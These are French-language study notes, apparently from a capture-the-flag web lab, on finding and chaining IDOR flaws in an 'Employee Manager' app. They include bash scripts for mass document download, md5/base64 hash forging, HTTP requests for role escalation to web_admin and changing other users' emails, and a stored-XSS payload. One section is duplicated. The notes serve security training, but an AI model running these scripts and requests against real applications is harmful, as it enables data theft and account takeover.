# IDOR - Identifying Insecure Direct Object References

## 1. Identifier les références directes
- Chercher dans :  
  - **URL params** : `?uid=1`, `?filename=file_1.pdf`  
  - **APIs** : `/api/user?id=1`  
  - **Cookies / Headers**  

### Tests simples
- Incrémentation : `?uid=2`, `?filename=file_2.pdf`  
- **Fuzzing** : wordlists pour tester plusieurs valeurs  
- Si accès à des données qui ne nous appartiennent pas → **IDOR confirmé**

## 2. Vérifier les appels AJAX
- Front-end JS peut contenir des fonctions admin désactivées mais encore accessibles.  
- Exemple :
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){ }
    });
}
```
➡ Même si non appelé par l’UI → tester directement l’endpoint (`change_password.php`).  

## 3. Comprendre encodage & hash
### Encodage simple (Base64)
- Paramètre : `?filename=ZmlsZV8xMjMucGRm`  
- Décodage → `file_123.pdf`  
- Réencoder un autre → `file_124.pdf` (`ZmlsZV8xMjQucGRm`)  

### Hashing
- Exemple en MD5 :
```javascript
$.ajax({
    url:"download.php",
    type:"post",
    data:{filename: CryptoJS.MD5('file_1.pdf').toString()}
});
```
➡ Calculer hash pour d’autres fichiers (`file_2.pdf`) → tester l’endpoint.  

## 4. Comparer les rôles utilisateurs
- Créer **User1** et **User2**  
- Observer les requêtes API et leurs paramètres  

### Exemple
User1 peut appeler :
```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```
➡ Tester la même API avec User2 (`/users/1`) → si données User1 accessibles → **IDOR**.  

## Résumé
- **IDOR = manque de contrôle d’accès back-end**.  
- Indices : incrémentation, encodage faible, hash prévisible, endpoints cachés en JS, API comparées entre users.  
- Outils utiles : Burp, fuzzers, hash identifier, base64 encoder/decoder.

---

# Mass IDOR Enumeration

---

## 1. Exemple basique – Insecure Parameters
- Application : **Employee Manager**  
- Paramètre vulnérable : `documents.php?uid=1`  

### Patterns de fichiers
- `/documents/Invoice_1_09_2021.pdf`  
- `/documents/Report_1_10_2021.pdf`  

➡ Prévisibles, basés sur `uid`.  
➡ Changer en `?uid=2` → accéder aux fichiers d’un autre employé :  
- `/documents/Invoice_2_08_2020.pdf`  
- `/documents/Report_2_12_2020.pdf`  

### Autres variantes
- Paramètre `uid_filter=1` manipulable  
- Suppression du filtre → affichage de **tous** les fichiers  

---

## 2. Enumeration manuelle
- Tester `?uid=3`, `?uid=4`, etc.  
- Inefficace avec des centaines d’utilisateurs → automatiser.  

---

## 3. Extraction avec curl + grep
### Identifier le pattern HTML
Exemple :  
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

### Récupération des liens
`curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"`

### Avec regex pour isoler les `.pdf`
`curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"`

---

## 4. Script d’automatisation (Bash)
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

➡ Télécharge tous les documents pour `uid=1..10`  

---

## 5. Alternatives
- **Burp Intruder** : brute force des `uid`  
- **ZAP Fuzzer** : fuzz massif des paramètres  
- **Scripts personnalisés** : Bash, PowerShell, Python  

---

## Résumé
- **Static File IDOR** = noms de fichiers prévisibles  
- **Param-based IDOR** = `uid` en clair manipulable  
- **Mass Enumeration** = automatisation (curl, grep, loops, fuzzers)  

---

# Mass IDOR Enumeration

## 1. Exemple basique – Insecure Parameters
- Application : **Employee Manager**  
- Paramètre vulnérable : `documents.php?uid=1`  

### Patterns de fichiers
- `/documents/Invoice_1_09_2021.pdf`  
- `/documents/Report_1_10_2021.pdf`  

➡ Prévisibles, basés sur `uid`.  
➡ Changer en `?uid=2` → accéder aux fichiers d’un autre employé :  
- `/documents/Invoice_2_08_2020.pdf`  
- `/documents/Report_2_12_2020.pdf`  

### Autres variantes
- Paramètre `uid_filter=1` manipulable  
- Suppression du filtre → affichage de **tous** les fichiers  

## 2. Enumeration manuelle
- Tester `?uid=3`, `?uid=4`, etc.  
- Inefficace avec des centaines d’utilisateurs → automatiser.  

## 3. Extraction avec curl + grep
### Identifier le pattern HTML
Exemple :  
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

### Récupération des liens
`curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"`

### Avec regex pour isoler les `.pdf`
`curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"`

## 4. Script d’automatisation (Bash)
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

➡ Télécharge tous les documents pour `uid=1..10`  

## 5. Alternatives
- **Burp Intruder** : brute force des `uid`  
- **ZAP Fuzzer** : fuzz massif des paramètres  
- **Scripts personnalisés** : Bash, PowerShell, Python  

---

# Bypassing Encoded References (IDOR)

## 1. Contexte
- Application : **Employee Manager** → Section **Contracts**  
- Téléchargement via `download.php` avec paramètre `contract` :  
`contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`  

Hash utilisé = **MD5** d’une valeur encodée.  

## 2. Vérification des hypothèses
### Test MD5 simple
`echo -n 1 | md5sum`  
➡ Ne correspond pas.  

### Découverte côté front-end
Dans le code source :  
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

- La valeur est `md5(base64(uid))`.  
- Exemple avec `uid=1` :  
`echo -n 1 | base64 -w 0 | md5sum`  
➡ `cdd96d3cc73d1dbdaffa03cc6cd7339b` ✅ correspond à la requête.

## 3. Génération des hashes (1 → 10)
`for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done`

Exemple de sortie :  
```
cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
...
```

## 4. Exploit – Script Bash
```bash
#!/bin/bash

url="http://SERVER_IP:PORT/download.php"

for i in {1..10}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" $url
done
```

➡ Télécharge automatiquement tous les contrats 1–10.  

## 5. Résultat attendu
`ls -1`  
```
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
...
```

## 🔑 Points clés
- Encodage **Base64** + hash **MD5** révélé côté client.  
- Reverse possible → **IDOR exploitable**.  
- Automatisation via script/fuzzer = récupération massive de documents.  

---

# IDOR in Insecure APIs

## 1. Contexte
- Application : **Employee Manager** → Edit Profile  
- API : `/profile/api.php/profile/1`  
- Méthode : `PUT` avec JSON

Exemple de payload intercepté :  
```json
{
  "uid": 1,
  "uuid": "40f5888b67c748df7efba008e7c2f9d2",
  "role": "employee",
  "full_name": "Amy Lindon",
  "email": "a_lindon@employees.htb",
  "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

## 2. Points d’attention
- Paramètres sensibles côté client : `uid`, `uuid`, `role`  
- Cookie d’authentification : `role=employee`  
- Risque : l’autorisation repose sur des valeurs manipulables par l’utilisateur.  

## 3. Vecteurs d’attaque testés

### a) Changer `uid`
- Tentative : `"uid": 2`  
- Résultat : `uid mismatch` → le back-end compare l’UID avec l’endpoint.  

### b) Changer endpoint + `uid`
- Tentative : `/profile/2` + `"uid": 2`  
- Résultat : `uuid mismatch` → validation côté back-end.  

### c) Création / suppression d’utilisateurs
- Tentative : `POST` ou `DELETE`  
- Résultat : erreurs `Creating new employees is for admins only` / `Deleting employees is for admins only`.  
- Probable contrôle basé sur `role=employee` cookie.  

### d) Élévation de rôle
- Tentative : changer `"role": "admin"`  
- Résultat : `Invalid role`.  
- Hypothèse : les rôles valides sont connus uniquement côté back-end.  

## 4. Analyse
- Les IDOR **Function Calls** sont partiellement protégées (contrôle UID/UUID + rôle côté serveur).  
- MAIS : la sécurité semble **faible côté GET requests** → possible **IDOR Information Disclosure**.  
- Si accessible : fuite de détails (`uuid`, `role`) utilisables pour construire des attaques plus fortes.  

## 5. Checks recommandés
- Tester GET sur `/profile/api.php/profile/X`  
- Vérifier si d’autres profils sont accessibles (infos sensibles = email, UUID, rôle).  
- Si oui → utiliser ces infos pour bypass UID/UUID checks et escalader privilèges.  

## 🔑 Points clés
- Les IDOR ne concernent pas que la lecture → aussi les fonctions (PUT, POST, DELETE).  
- Protéger les **fonctions sensibles** (update, delete, create) avec un **contrôle d’accès côté serveur**.  
- Tester toujours l’API en lecture (GET) → fuite possible de données utiles à l’attaque.  

---

# Chaining IDOR Vulnerabilities

## 1. Information Disclosure

### Test GET sur un autre `uid`
```
GET /profile/api.php/profile/2
Cookie: role=employee
```

Réponse :
```json
{
  "uid": "2",
  "uuid": "4a9bd19b3b8676199592a346051f950c",
  "role": "employee",
  "full_name": "Iona Franklyn",
  "email": "i_franklyn@employees.htb",
  "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

➡️ Fuite d’informations sensibles (UUID, email, rôle).

## 2. Modifying Other Users’ Details

### PUT avec `uuid` récupéré
```
PUT /profile/api.php/profile/2
Content-Type: application/json
Cookie: role=employee

{
  "uid": "2",
  "uuid": "4a9bd19b3b8676199592a346051f950c",
  "role": "employee",
  "full_name": "Pwned User",
  "email": "attacker@evil.htb",
  "about": "XSS <script>alert(1)</script>"
}
```

- ✅ Modifications acceptées (pas d’erreur).  
- Attaques possibles :
  - **Password reset takeover** → modifier l’email d’un user.  
  - **Stored XSS** → injecter dans le champ `about`.  

## 3. Enumeration → Trouver Admin

Script d’énumération → extraire UUIDs et rôles de tous les `uid`.  
Exemple de réponse pour un admin :

```json
{
  "uid": "X",
  "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
  "role": "web_admin",
  "full_name": "administrator",
  "email": "webadmin@employees.htb",
  "about": "HTB{FLAG}"
}
```

## 4. Role Escalation

### Update rôle → `web_admin`
```
PUT /profile/api.php/profile/1
Content-Type: application/json
Cookie: role=employee

{
  "uid": "1",
  "uuid": "40f5888b67c748df7efba008e7c2f9d2",
  "role": "web_admin",
  "full_name": "Amy Lindon",
  "email": "a_lindon@employees.htb",
  "about": "..."
}
```

Réponse :
```json
{
  "uid": "1",
  "uuid": "40f5888b67c748df7efba008e7c2f9d2",
  "role": "web_admin",
  "full_name": "Amy Lindon",
  "email": "a_lindon@employees.htb",
  "about": "..."
}
```

- ✅ Aucun message d’erreur, rôle modifié.  
- ⚡ Mettre à jour le cookie : `role=web_admin`.  

## 5. Exploitation en tant qu’Admin

### Créer un nouvel utilisateur
```
POST /profile/api.php
Content-Type: application/json
Cookie: role=web_admin

{
  "uid": "99",
  "uuid": "deadbeefcafebabe",
  "role": "employee",
  "full_name": "NewUser",
  "email": "new@evil.htb",
  "about": "autocreated"
}
```

Réponse : `HTTP/1.1 200 OK`

### Vérification
```
GET /profile/api.php/profile/99
Cookie: role=web_admin
```

Réponse : détails du nouvel utilisateur.

## 6. Attaques possibles
- **Takeover massif** : modifier les emails de tous les comptes et déclencher reset password.  
- **XSS global** : injecter un payload dans `about` pour tous les profils.  

💡 Script possible : boucler sur tous les `uid`, récupérer leur `uuid` via GET, puis envoyer un `PUT` pour changer leur email. 

---



























